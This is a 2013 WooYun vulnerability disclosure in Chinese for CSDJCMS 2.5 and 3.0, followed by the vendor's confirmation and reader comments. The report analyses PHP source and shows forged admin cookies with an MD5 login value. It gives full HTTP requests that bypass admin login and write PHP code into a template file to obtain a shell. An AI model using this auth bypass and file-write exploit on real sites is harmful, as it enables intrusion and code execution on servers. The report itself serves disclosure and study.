{"id": 12363, "wybug_id": "wooyun-2013-022422", "wybug_title": "CSDJCMS拿shell漏洞与PHP源码分析过程", "wybug_corp": "chshcms.com", "wybug_author": "枫叶", "wybug_date": "2013-04-24 22:21", "wybug_open_date": "2013-06-08 22:21", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "欺骗", "安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-05-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-08：\t细节向公众公开  简要描述： CSDJCMS漏洞后台拿shell 详细说明：  \ninclude_once(\"include/install.php\");if(S_IsInstall==0){        header(\"Location:install/install.php\");        }include_once(\"include/label.php\");if(S_Webmode==1 or !file_exists(\"index.html\")){          //缓存区          $cache_id ='index_';          if(!($cache_opt->start($cache_id))){                   echo GetTemp(\"index.html\",0);                          $cache_opt->end();          }        }else{        header(\"Location:index.html\");        }//看他配置吧function SafeRequest($key,$mode,$isfilter=''){    set_magic_quotes_runtime(0);    $magic= get_magic_quotes_gpc();    switch ($mode){         case 'post':             $value=isset($_POST[$key]) ?$magic?trim($_POST[$key]):addslashes(trim($_POST[$key])) : '';         break;         case 'get':             $value=isset($_GET[$key]) ?$magic?trim($_GET[$key]):addslashes(trim($_GET[$key])) : '';         break;         default:             $value=isset($_POST[$key]) ?$magic?trim($_POST[$key]):addslashes(trim($_POST[$key])) : '';             if($value==\"\"){                  $value=isset($_GET[$key]) ?$magic?trim($_GET[$key]):addslashes(trim($_GET[$key])) : '';             }         break;    }       if($isfilter!=''){          $value=lib_replace_end_tag($value);       }  return $value;}//变量的提交进行了addslashes安全过滤//研究了半天的源码发现后台的严重出现了大的安全问题include \"../include/conn.php\";include \"../include/function.php\";include \"admin_version.php\";include \"admin_loginstate.php\"; //问题出在这个文件当中//跟入if(empty($_COOKIE['S_AdminID'])){  //首先看是否存在s_adminid这个cooke                echo \"<script>window.location='admin_login.php'</script>\";                }        elseif($_COOKIE['S_Login']!=md5($_COOKIE['S_AdminID'].$_COOKIE['S_AdminUserName'].$_COOKIE['S_AdminPassWord'].$_COOKIE['S_Permission'])){   //这里就是问题的关键之处了如果s_login 的值等于 四个cookie 相加的md5加密，即可直接验证通过                echo \"<script>window.parent.location='admin_login.php'</script>\";                }//后台权限判断function SystemPer($Column){   if(empty($_COOKIE['S_Permission'])){        die(\"<script>jAlert('对不起，您无权限操作此功能！','操作错误',function(R){window.location='javascript:history.go(-1)';})</script>\");   }else{        $SystemPermission=explode(\",\",$_COOKIE['S_Permission']); //权限的判断，用“，”来分割成数组        $StateOK=0;        $ArrSystemPermission=count($SystemPermission);           for($k=0;$k<$ArrSystemPermission;$k++){               if($SystemPermission[$k]==$Column){   //判断                     $StateOK=1;                 }           }       if($StateOK==0){            die(\"<script>jAlert('对不起，您无权限操作此功能！','操作错误',function(R){window.location='javascript:history.go(-1)';})</script>\");       }    }}//构造淫荡的cookies//S_Permission//1,2,3,4,5,6,7,8,9,10,11,12,13,14,15//S_Login//md5(AdminID+AdminUserName+AdminPassWord+S_Permission)//S_AdminUserName//1//S_AdminPassWord//1//S_AdminID//1后台成功绕过。//看看3.0版本，也是一样<?php# Name: PHP版程氏音乐CMS管理系统 v3.0# Author: 程氏<[email]web@chshcms.com[/email]> [QQ:848769359]# Homepage:[url]http://www.chshcms.cn/[/url]$CS_Path=$_SERVER['PHP_SELF'];$CS_Pathall=explode(\"/\",$CS_Path);$CS_Admin=$CS_Pathall[1].\"/\";        if(empty($_COOKIE['CS_AdminID'])){                echo \"<script>window.parent.location='\".CS_WebPath.$CS_Admin.\"login.php';</script>\";                }        elseif($_COOKIE['CS_Login']!=md5($_COOKIE['CS_AdminID'].$_COOKIE['CS_AdminUserName'].$_COOKIE['CS_AdminPassWord'].$_COOKIE['CS_Quanx'])){                echo \"<script>window.parent.location='\".CS_WebPath.$CS_Admin.\"login.php'</script>\";                }//后台权限判断function SystemPer($Column){   if(empty($_COOKIE['CS_Quanx'])){        die(\"<script>alert('对不起，您无权限操作此功能！');window.location='javascript:history.go(-1);'</script>\");        exit();   }else{        $SystemPermission=explode(\",\",$_COOKIE['CS_Quanx']);        $StateOK=0;        $ArrSystemPermission=count($SystemPermission);           for($k=0;$k<$ArrSystemPermission;$k++){              if($SystemPermission[$k]==$Column){                     $StateOK=1;                 }           }       if($StateOK==0){            die(\"<script>alert('对不起，您无权限操作此功能！');window.location='javascript:history.go(-1);'</script>\");            exit();       }    }\n   漏洞证明：  exp V2.5Host: www.xxx.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.xxx.com/admin/admin_t ... ;file=artindex.htmlCookie: S_Permission=1,2,3,4,5,6,7,8,9,10,11,12,13,14,15; S_Login=d8d998f3eb371c2009acd8580c1821d0; S_AdminUserName=1; S_AdminPassWord=1; S_AdminID=1; CNZZDATA4170884=cnzz_eid%3D1098390420-1364934762-http%253A%252F%252Fwww.hshxs.com%26ntime%3D1364935608%26cnzz_a%3D19%26retime%3D1365111972892%26sin%3Dnone%26ltime%3D1365111972892%26rtime%3D0; bdshare_firstime=1365107576347; PHPSESSID=u6kd9d6f18fhfr9bi4if6agcj6Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 169FileName=cs-bottom.php&content=%3C%3Fphp+phpinfo+%3F%3E&folder=..%2Fskins%2Findex%2Fhtml%2F&tempname=%C4%AC%C8%CF%C4%A3%B0%E6&Submit=%D0%DE%B8%C4%B5%B1%C7%B0%C4%A3%B0%E5--------------------------------------------exp V3.0：Host: www.xxx.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.xxx.com/admin/skins/s ... ;name=cs-bottom.phpCookie: CS_AdminID=1; CS_AdminUserName=1; CS_AdminPassWord=1; CS_Quanx=0_1,1_1,1_2,1_3,1_4,1_5,2_1,2_2,2_3,2_4,2_5,2_6,2_7,3_1,3_2,3_3,3_4,4_1,4_2,4_3,4_4,4_5,4_6,4_7,5_1,5_2,5_3,5_4,5_5,6_1,6_2,6_3,7_1,7_2,8_1,8_2,8_3,8_4; CS_Login=a3f5f5a662e8a36525f4794856e2d0a2; PHPSESSID=48ogo025b66lkat9jtc8aecub1; CNZZDATA3755283=cnzz_eid%3D1523253931-1364956519-http%253A%252F%252Fwww.djkao.com%26ntime%3D1364956519%26cnzz_a%3D1%26retime%3D1365129491148%26sin%3D%26ltime%3D1365129491148%26rtime%3D0; bdshare_firstime=1365129335963Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 57name=cs-bottom.php&content=%3C%3Fphp+phpinfo%28%29+%3F%3E   修复方案：     版权声明：转载请注明来源 枫叶@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-04-24 22:24 厂商回复： 谢谢提醒，已经修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-26 20:19 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:172        | W币花完了，刷分还是不刷？)\t\t \n  这么好的分析才给5分    \n     2013-07-05 14:37 |    \t\tknife \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:24        | 抬枪上御女，提臀迎众基。)\t\t \n  版权呢？老子找的漏洞。你要脸不？    \n     2014-09-30 16:24 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:58        | going)\t\t \n  这个分析确实不错。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}